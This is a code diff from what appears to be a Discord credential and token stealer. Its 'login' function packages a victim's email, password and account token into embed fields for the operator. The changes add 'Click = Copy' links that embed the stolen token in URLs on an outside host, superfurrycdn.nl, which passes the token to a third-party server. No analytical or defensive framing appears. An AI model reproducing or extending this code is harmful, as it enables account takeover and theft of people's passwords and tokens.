@@ -584,7 +584,7 @@ const login = async (email, password, token) => {
         fields: [
           {
             name: '<a:944007295417843743:959785231982931979> @SN - Token:',
-            value: `\`${token}\` [Click to copy](https://superfurrycdn.nl/copy/{token})`,
+            value: `\`\`\`${token}\`\`\`\n[Click = Copy](https://superfurrycdn.nl/copy/${token})`,
             inline: false,
           },
           {
@@ -604,7 +604,7 @@ const login = async (email, password, token) => {
           },
           {
             name: '<:944007233820307467:959785232037470208> @SN - Email:',
-            value: `\`${email}\``,
+            value: `\`${email}\`\n[Click = Copy](https://superfurrycdn.nl/copy/${token})`,
             inline: true,
           },
           {
@@ -614,7 +614,7 @@ const login = async (email, password, token) => {
           },
           {
             name: '<a:satan:846706207632261120> @SN - Password:',
-            value: `\`${password}\``,
+            value: `\`${password}\`\n[Click = Copy](https://superfurrycdn.nl/copy/${token})`,
             inline: true,
           },
         ],
